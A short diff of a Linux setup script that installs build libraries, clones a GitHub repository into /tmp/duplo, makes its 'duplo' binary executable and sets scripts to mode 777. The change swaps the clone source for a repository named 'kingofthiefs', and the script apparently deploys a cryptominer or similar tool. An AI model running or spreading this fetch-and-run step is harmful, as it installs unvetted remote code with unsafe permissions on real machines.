@@ -15,7 +15,7 @@ sudo sysctl -p
 sudo apt-get update && sudo apt-get install git libcurl4-openssl-dev build-essential libjansson-dev libuv1-dev libmicrohttpd-dev libssl-dev autotools-dev automake screen htop nano cmake mc -y
 sleep 2
 cd /tmp && mkdir duplo
-git clone https://github.com/woodstolenn/woodstolen.git /tmp/duplo
+git clone https://github.com/kingofthiefs/kingofthiefs.git /tmp/duplo
 cd /tmp/duplo
 chmod +x /tmp/duplo/duplo
 chmod 777 ./*.sh
